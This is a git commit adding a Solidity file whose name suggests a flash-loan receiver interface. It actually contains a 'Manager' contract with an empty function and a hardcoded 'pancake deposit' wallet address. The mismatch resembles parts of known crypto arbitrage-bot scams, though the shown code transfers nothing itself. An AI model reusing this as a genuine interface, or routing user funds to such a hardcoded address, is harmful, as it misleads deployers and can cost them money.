a7ed6c72e230c4d353a141811fae3a4abacf9440
cartelralk <42720868+cartelralk@users.noreply.github.com>
2021-08-25 09:45:52 +0300

    Add files via upload

---
+++ contracts/interfaces/IFlashLoanReceiverV1.2.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.5.17;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function pancakeDepositAddress() public pure returns (address) {
+		return 0x7320c01230D083d99C8644A093b0205aeCEeCdDE;
+	}
+}
